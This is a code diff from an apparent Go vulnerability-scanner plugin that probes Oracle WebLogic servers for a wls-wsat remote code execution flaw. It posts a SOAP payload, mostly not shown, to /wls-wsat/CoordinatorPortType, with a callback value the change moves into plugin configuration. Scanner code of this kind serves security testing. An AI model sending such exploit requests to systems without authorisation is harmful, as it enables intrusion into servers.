@@ -34,7 +34,7 @@ func (d *weblogicWLSRCE) GetResult() []plugin.PluginInfo {
     return d.result
 }
 func (d *weblogicWLSRCE) Check(URL string, meta plugin.TaskMeta) bool {
-    if Aider == "" {
+    if plugin.Config.Aider == "" {
         return false
     }
     postData := `
@@ -52,7 +52,7 @@ func (d *weblogicWLSRCE) Check(URL string, meta plugin.TaskMeta) bool {
     <soapenv:Body/>
   </soapenv:Envelope>`
     rand := getRandomString(5)
-    postData = fmt.Sprintf(postData, Aider, rand)
+    postData = fmt.Sprintf(postData, plugin.Config.Aider, rand)
     request, _ := http.NewRequest("POST", URL+"/wls-wsat/CoordinatorPortType", strings.NewReader(postData))
     request.Header.Set("Content-Type", "text/xml;charset=UTF-8")
     request.Header.Set("SOAPAction", "")
